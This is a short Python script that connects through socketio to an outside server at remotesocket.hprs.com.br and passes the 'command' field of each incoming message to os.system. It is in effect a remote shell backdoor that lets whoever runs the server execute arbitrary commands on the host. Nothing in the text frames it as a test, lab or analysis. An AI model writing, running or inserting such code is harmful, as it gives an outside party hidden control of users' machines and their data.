import socketio
import os
sio = socketio.Client()

@sio.event
def connect():
    print('connection established')

@sio.event
def my_message(data):
    print(data)
    os.system(data.get('command'))

@sio.event
def disconnect():
    print('disconnected from server')

sio.connect('http://remotesocket.hprs.com.br')
sio.wait()